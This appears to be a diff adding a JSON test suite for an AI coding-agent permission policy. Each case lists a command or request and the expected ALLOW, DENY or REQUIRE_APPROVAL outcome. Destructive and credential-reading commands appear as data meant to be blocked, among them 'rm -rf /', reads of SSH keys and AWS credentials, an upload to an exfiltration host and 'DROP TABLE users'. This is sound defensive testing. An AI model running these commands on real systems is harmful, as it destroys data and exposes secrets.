@@ -1,0 +1,515 @@
+{
+  "schema_version": "v1",
+  "identity": {
+    "principal": "developer",
+    "agent": "claude-code",
+    "environment": "local"
+  },
+  "cases": [
+    {
+      "name": "home directory wipe is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "rm",
+            "-rf",
+            "tests/",
+            "patches/",
+            "plan/",
+            "~/"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": [
+        "safe-dev-deny-catastrophic-delete"
+      ]
+    },
+    {
+      "name": "filesystem root wipe is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "rm",
+            "-rf",
+            "/"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": [
+        "safe-dev-deny-catastrophic-delete"
+      ]
+    },
+    {
+      "name": "absolute path delete is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "rm",
+            "-rf",
+            "/tmp/build"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": [
+        "safe-dev-deny-catastrophic-delete"
+      ]
+    },
+    {
+      "name": "parent directory delete is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "rm",
+            "-rf",
+            "../other-project"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": [
+        "safe-dev-deny-catastrophic-delete"
+      ]
+    },
+    {
+      "name": "rmdir of a drive root is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "rmdir",
+            "/s",
+            "/q",
+            "/mnt/e/"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": [
+        "safe-dev-deny-catastrophic-delete"
+      ]
+    },
+    {
+      "name": "workspace delete has no allow rule",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "rm",
+            "-rf",
+            "build/"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": []
+    },
+    {
+      "name": "dotenv read through cat is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "cat",
+            "./config/.env"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": [
+        "safe-dev-deny-exec-secret-file-args"
+      ]
+    },
+    {
+      "name": "dotenv variant read is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "head",
+            "-n",
+            "5",
+            ".env.production"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": [
+        "safe-dev-deny-exec-secret-file-args"
+      ]
+    },
+    {
+      "name": "ssh key read through cat is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "cat",
+            "/home/dev/.ssh/id_rsa"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": [
+        "safe-dev-deny-exec-secret-file-args"
+      ]
+    },
+    {
+      "name": "aws credentials read is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "cat",
+            "~/.aws/credentials"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": [
+        "safe-dev-deny-exec-secret-file-args"
+      ]
+    },
+    {
+      "name": "staging dotenv into git is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "git",
+            "add",
+            ".env"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": [
+        "safe-dev-deny-exec-secret-file-args"
+      ]
+    },
+    {
+      "name": "copying a private key is denied",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "cp",
+            "certs/server.pem",
+            "/tmp/"
+          ]
+        }
+      },
+      "expect": "DENY"
+    },
+    {
+      "name": "dotenv file read is denied",
+      "action": {
+        "action_type": "fs.read",
+        "resource": "file://workspace/.env",
+        "params": {}
+      },
+      "expect": "DENY"
+    },
+    {
+      "name": "nested ssh key read is denied",
+      "action": {
+        "action_type": "fs.read",
+        "resource": "file://workspace/deploy/.ssh/id_rsa",
+        "params": {}
+      },
+      "expect": "DENY"
+    },
+    {
+      "name": "authorization header egress is denied",
+      "action": {
+        "action_type": "net.http_request",
+        "resource": "url://api.example.com/v1/export",
+        "params": {
+          "method": "POST",
+          "headers": {
+            "Authorization": "Bearer token"
+          }
+        }
+      },
+      "expect": "DENY"
+    },
+    {
+      "name": "unknown host egress is denied by default",
+      "action": {
+        "action_type": "net.http_request",
+        "resource": "url://exfil.example.net/upload",
+        "params": {
+          "method": "POST"
+        }
+      },
+      "expect": "DENY",
+      "rules": []
+    },
+    {
+      "name": "secret checkout is denied",
+      "action": {
+        "action_type": "secrets.checkout",
+        "resource": "secret://vault/db-password",
+        "params": {
+          "secret_id": "db-password"
+        }
+      },
+      "expect": "DENY"
+    },
+    {
+      "name": "privilege escalation has no allow rule",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "sudo",
+            "rm",
+            "-rf",
+            "/var/lib/postgresql"
+          ]
+        }
+      },
+      "expect": "DENY",
+      "rules": []
+    },
+    {
+      "name": "force push needs review",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "git",
+            "push",
+            "--force",
+            "origin",
+            "main"
+          ]
+        }
+      },
+      "expect": "REQUIRE_APPROVAL"
+    },
+    {
+      "name": "plain push needs review",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "git",
+            "push",
+            "origin",
+            "main"
+          ]
+        }
+      },
+      "expect": "REQUIRE_APPROVAL",
+      "rules": [
+        "safe-dev-approve-git-push"
+      ]
+    },
+    {
+      "name": "hard reset with arguments needs review",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "git",
+            "reset",
+            "--hard",
+            "HEAD~5"
+          ]
+        }
+      },
+      "expect": "REQUIRE_APPROVAL",
+      "rules": [
+        "safe-dev-approve-git-destructive-with-args"
+      ]
+    },
+    {
+      "name": "git clean needs review",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "git",
+            "clean",
+            "-fdx"
+          ]
+        }
+      },
+      "expect": "REQUIRE_APPROVAL",
+      "rules": [
+        "safe-dev-approve-git-destructive-with-args"
+      ]
+    },
+    {
+      "name": "terraform destroy needs review",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "terraform",
+            "destroy",
+            "-auto-approve"
+          ]
+        }
+      },
+      "expect": "REQUIRE_APPROVAL",
+      "rules": [
+        "safe-dev-approve-infra-mutations"
+      ]
+    },
+    {
+      "name": "kubectl delete needs review",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "kubectl",
+            "delete",
+            "namespace",
+            "prod"
+          ]
+        }
+      },
+      "expect": "REQUIRE_APPROVAL",
+      "rules": [
+        "safe-dev-approve-infra-mutations"
+      ]
+    },
+    {
+      "name": "database client needs review",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "psql",
+            "-c",
+            "DROP TABLE users;"
+          ]
+        }
+      },
+      "expect": "REQUIRE_APPROVAL",
+      "rules": [
+        "safe-dev-approve-db-mutations"
+      ]
+    },
+    {
+      "name": "git status is allowed",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "git",
+            "status"
+          ]
+        }
+      },
+      "expect": "ALLOW",
+      "rules": [
+        "safe-dev-allow-git-readonly"
+      ]
+    },
+    {
+      "name": "go test is allowed",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "go",
+            "test",
+            "./..."
+          ]
+        }
+      },
+      "expect": "ALLOW",
+      "rules": [
+        "safe-dev-allow-build-test"
+      ]
+    },
+    {
+      "name": "reading source with cat is allowed",
+      "action": {
+        "action_type": "process.exec",
+        "resource": "file://workspace/",
+        "params": {
+          "argv": [
+            "cat",
+            "src/main.go"
+          ]
+        }
+      },
+      "expect": "ALLOW",
+      "rules": [
+        "safe-dev-allow-readonly-file-tools"
+      ]
+    },
+    {
+      "name": "source file read is allowed",
+      "action": {
+        "action_type": "fs.read",
+        "resource": "file://workspace/src/main.go",
+        "params": {}
+      },
+      "expect": "ALLOW",
+      "rules": [
+        "safe-dev-allow-workspace-read"
+      ]
+    },
+    {
+      "name": "workspace write is allowed",
+      "action": {
+        "action_type": "fs.write",
+        "resource": "file://workspace/src/main.go",
+        "params": {
+          "content": "package main"
+        }
+      },
+      "expect": "ALLOW",
+      "rules": [
+        "safe-dev-allow-workspace-write"
+      ]
+    },
+    {
+      "name": "github get is allowed",
+      "action": {
+        "action_type": "net.http_request",
+        "resource": "url://github.com/safe-agentic-world/nomos",
+        "params": {
+          "method": "GET"
+        }
+      },
+      "expect": "ALLOW",
+      "rules": [
+        "safe-dev-allow-http-get-allowlist"
+      ]
+    }
+  ]
+}
